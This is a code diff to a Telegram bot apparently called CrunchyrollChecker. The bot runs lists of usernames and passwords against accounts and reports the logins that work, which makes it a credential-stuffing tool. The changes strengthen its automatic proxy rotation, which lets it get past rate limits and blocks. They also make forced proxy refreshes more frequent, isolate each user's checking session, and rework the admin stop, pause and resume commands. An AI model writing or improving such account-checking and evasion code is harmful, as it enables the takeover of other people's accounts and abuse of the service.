@@ -627,7 +627,6 @@ def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tr
             bump_proxy_score(proxy.get("https",""), 1)
         except:
             pass
-    # FIX: Rate limit + proxy auto rotation + decline fix
     if st in ("rate", "err") and tries > 1:
         if proxy:
             try:
@@ -1135,7 +1134,14 @@ def refresh_live_proxies(force: bool = False) -> None:
                 if url and url not in MANUAL_PROXY_URLS:
                     AUTO_PROXY_URLS.add(url)
         threading.Thread(target=save_proxy_scores, daemon=True).start()
-        logger.info("Live proxies ready: %d auto + %d manual = %d total (tested %d from %d candidates)", len(live), len(manual_keep) if 'manual_keep' in locals() else 0, len(LIVE_PROXIES), len(to_test) if 'to_test' in locals() else 0, len(candidates) if 'candidates' in locals() else 0)
+        # Save pool to file for persistence
+        try:
+            pool_items = [p.get("https","") for p in LIVE_PROXIES if p.get("https")]
+            if pool_items:
+                pool_save(pool_items)
+        except Exception as e:
+            logger.warning(f"pool_save failed: {e}")
+        logger.info("Live proxies ready: %d auto + %d manual = %d total (tested %d from %d candidates) - AUTO LOAD FIX", len(live), len(manual_keep) if 'manual_keep' in locals() else 0, len(LIVE_PROXIES), len(to_test) if 'to_test' in locals() else 0, len(candidates) if 'candidates' in locals() else 0)
     finally:
         _refresh_busy.release()
 
@@ -1144,9 +1150,15 @@ def ensure_proxies() -> None:
         _load_pool_into_live()
         if proxy_count() == 0:
             try:
-                refresh_live_proxies(force=False)
-            except Exception:
-                pass
+                logger.info("ensure_proxies: 0 live, force refreshing...")
+                refresh_live_proxies(force=True)
+            except Exception as e:
+                logger.warning(f"ensure_proxies refresh failed: {e}")
+                # Fallback: try again with force
+                try:
+                    refresh_live_proxies(force=True)
+                except:
+                    pass
 
 def _proxy_loop() -> None:
     while True:
@@ -1154,31 +1166,34 @@ def _proxy_loop() -> None:
             auto_on = True
             try:
                 auto_on = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
-            except Exception:
+            except:
                 auto_on = True
             if auto_on:
                 pc = proxy_count()
-                if pc < 20:
+                # Auto proxy load fix - more aggressive refresh when low
+                if pc < 50:
+                    logger.info(f"Auto proxy load: low proxies {pc} < 50, force refreshing...")
                     refresh_live_proxies(force=True)
+                elif pc < 100:
+                    refresh_live_proxies(force=False)
                 else:
                     refresh_live_proxies(force=False)
-                # also save scores periodically
-                if random.random() < 0.2:
+                if random.random() < 0.3:
                     try:
                         save_proxy_scores()
                     except:
                         pass
         except Exception as e:
             logger.warning("Proxy loop error: %s", sanitize_log(str(e)))
+        # Sleep but check every minute if proxies low
         for _ in range(PROXY_REFRESH_MINUTES):
             time.sleep(60)
             try:
-                if proxy_count() < 15:
+                if proxy_count() < 30:
                     break
             except:
                 break
 
-# ---------------- Custom proxy pool ----------------
 def pool_load() -> List[str]:
     try:
         if POOL_FILE.exists():
@@ -1456,8 +1471,7 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
 
     lock = threading.Lock()
 
-    # FIX: User isolation - each user gets local copy, isolated, fixes bot not working for other users
-    # Fixes: bot user-user isolated nhi hai, ek user jab chk chala rha tab baki users ke pass bot not working
+    # USER ISOLATION FIX - each user gets local copy, isolated
     with PROXY_LOCK:
         local_proxies = list(LIVE_PROXIES)
         local_manual = set(MANUAL_PROXY_URLS)
@@ -1500,7 +1514,6 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
         return None
 
     def worker(cred: dict):
-        # FIX: Pause/Stop instant - check before each attempt
         if uid is not None:
             if STOP_REQUEST.get(uid):
                 return cred, "stopped", _blank_data("")
@@ -1514,7 +1527,6 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
             proxy = next_proxy()
             try:
                 r = check_credential(cred, proxy)
-                # Check stop immediately after check
                 if uid is not None and STOP_REQUEST.get(uid):
                     return cred, "stopped", _blank_data("")
                 if r["st"] == "rate" and attempt < 2:
@@ -1551,19 +1563,13 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
                 try:
                     if STOP_REQUEST.get(uid):
                         results["stopped"] = True
-                        # Cancel all pending futures immediately
-                        for f in futures:
+                        for f in list(futures.keys()):
                             try:
                                 f.cancel()
-                            except:
+                            except Exception:
                                 pass
-                        # Shutdown executor
-                        try:
-                            ex.shutdown(wait=False, cancel_futures=True)
-                        except:
-                            pass
                         break
-                except:
+                except Exception:
                     pass
             cred = futures[fut]
             try:
@@ -2872,26 +2878,36 @@ async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not is_admin(user.id, getattr(user, "username", None)):
                 await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                 return
+            busy = False
             with USER_LOCK:
-                STOP_REQUEST[user.id] = True
-                PAUSE_REQUEST.pop(user.id, None)
-            await reply_menu(msg, "🛑 Stopping... Scan will stop.", [[("Stop Again", "stopcheck", "danger"), ("Menu", "menu", "danger")]])
+                if USER_LAST_CHECK.get(f"busy_{user.id}"):
+                    busy = True
+                    STOP_REQUEST[user.id] = True
+            if busy:
+                await reply_menu(msg, "🛑 <b>Stopping...</b>\n<i>Current scan will stop in a moment</i>", [[("🛑 Stop Again", "stopcheck", "danger"), ("⬅️ Menu", "menu", "danger")]])
+            else:
+                await reply_menu(msg, "ℹ️ No active check running.", [[("⬅️ Back", "menu", "danger")]])
             return
         if txt_lower in ("/pause", "/pausecheck"):
             if not is_admin(uid, getattr(user, "username", None)):
                 await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                 return
             with USER_LOCK:
-                PAUSE_REQUEST[uid] = True
-            await reply_menu(msg, "⏸️ Pausing... Will pause after current batch", [[("▶️ Resume", "resumecheck", "success"), ("🛑 Stop", "stopcheck", "danger")]])
+                if USER_LAST_CHECK.get(f"busy_{uid}"):
+                    PAUSE_REQUEST[uid] = True
+                    await reply_menu(msg, "⏸️ <b>Pausing...</b>\n<i>Check will pause after current batch</i>", [[("▶️ Resume", "resumecheck", "success"), ("🛑 Stop", "stopcheck", "danger")]])
+                else:
+                    await reply_menu(msg, "ℹ️ No active check to pause.", [[("⬅️ Back", "menu", "danger")]])
             return
         if txt_lower in ("/resume", "/resumecheck"):
             if not is_admin(uid, getattr(user, "username", None)):
                 await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                 return
-            with USER_LOCK:
+            if PAUSE_REQUEST.get(uid):
                 PAUSE_REQUEST.pop(uid, None)
-            await reply_menu(msg, "▶️ Resumed — continuing...", [[("🛑 Stop", "stopcheck", "danger"), ("⏸️ Pause", "pausecheck", "primary")]])
+                await reply_menu(msg, "▶️ <b>Resumed</b> — check continuing...", [[("🛑 Stop", "stopcheck", "danger")]])
+            else:
+                await reply_menu(msg, "ℹ️ No paused check.", [[("⬅️ Back", "menu", "danger")]])
             return
         if txt_lower in ("/proxy", "/proxies", "/proxyinfo", "/pool"):
             if not is_admin(user.id, getattr(user, "username", None)):
@@ -3571,7 +3587,7 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await q.answer("⏸️ Pausing...", show_alert=False)
             except:
                 pass
-            await edit_menu(m, "⏸️ <b>Pausing...</b>\nCheck will pause after current batch\n\nResume or Stop", [[("▶️ Resume", "resumecheck", "success"), ("🛑 Stop", "stopcheck", "danger")]])
+            await edit_menu(m, "⏸️ Pausing... Will pause after current batch", [[("▶️ Resume", "resumecheck", "success"), ("🛑 Stop", "stopcheck", "danger")]])
             return
 
         if data == "resumecheck":
@@ -3583,7 +3599,7 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await q.answer("▶️ Resumed", show_alert=False)
             except:
                 pass
-            await edit_menu(m, "▶️ <b>Resumed</b> — check continuing...", [[("🛑 Stop", "stopcheck", "danger"), ("⏸️ Pause", "pausecheck", "primary")]])
+            await edit_menu(m, "▶️ Resumed — continuing...", [[("🛑 Stop", "stopcheck", "danger"), ("⏸️ Pause", "pausecheck", "primary")]])
             return
 
         if data == "menu":
@@ -4021,6 +4037,18 @@ def main():
     # Load upgraded data
     load_proxy_scores()
     BANNED_USERS = load_banned()
+    # AUTO PROXY LOAD FIX - ensure proxies loaded at startup
+    try:
+        _load_pool_into_live()
+        if proxy_count() == 0:
+            print("[*] Auto proxy load: 0 live at startup, force refreshing in background...")
+            threading.Thread(target=lambda: refresh_live_proxies(force=True), daemon=True).start()
+        else:
+            print(f"[*] Auto proxy load: {proxy_count()} live from pool, background refresh starting...")
+            threading.Thread(target=lambda: refresh_live_proxies(force=False), daemon=True).start()
+    except Exception as e:
+        print(f"[!] Auto proxy load startup failed: {e}")
+        threading.Thread(target=lambda: refresh_live_proxies(force=True), daemon=True).start()
     print(f"[*] CrunchyrollChecker — BlazeNXT starting")
     print(f"[*] Owner: {OWNER_USERNAME} ({OWNER_ID}) | Threads: {THREADS} | Data dir: {DATA_DIR.resolve()}")
     print(f"[*] Banned: {len(BANNED_USERS)} | Scores: {len(PROXY_SCORES)} | Flask: {FLASK_OK}")
